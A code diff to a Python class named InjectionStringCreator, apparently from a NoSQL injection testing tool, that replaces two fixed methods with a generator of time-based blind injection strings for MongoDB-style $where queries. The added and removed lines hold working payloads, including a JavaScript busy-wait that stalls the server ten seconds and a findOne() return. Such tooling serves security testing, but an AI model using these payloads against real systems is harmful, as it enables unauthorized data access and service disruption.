@@ -59,17 +59,12 @@ class InjectionStringCreator:
         for st in itertools.product(self.leftPart, informations, self.rightPart):
             yield "%s%s%s" % (st[0],st[1],st[2])
 
-    #def createWhereOneStrString():
-    #    return "=1; return db.a.findOne(); var dummy='!"
-
-    #def createWhereOneIntString():
-    #    return "=a'; return db.a.findOne(); var dummy=1"
-
-    def createTimeStrString(self):
-        return "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"
-
-    def createTimeIntString(self):
-        return "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"
+    def createTimeString(self):
+        informations = [
+            'var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return;'
+                ]
+        for st in itertools.product(self.leftPart, informations, self.rightPart):
+            yield "%s%s%s" %(st[0],st[1],st[2])
 
     def createBlindNeqString(self):
         informations = [
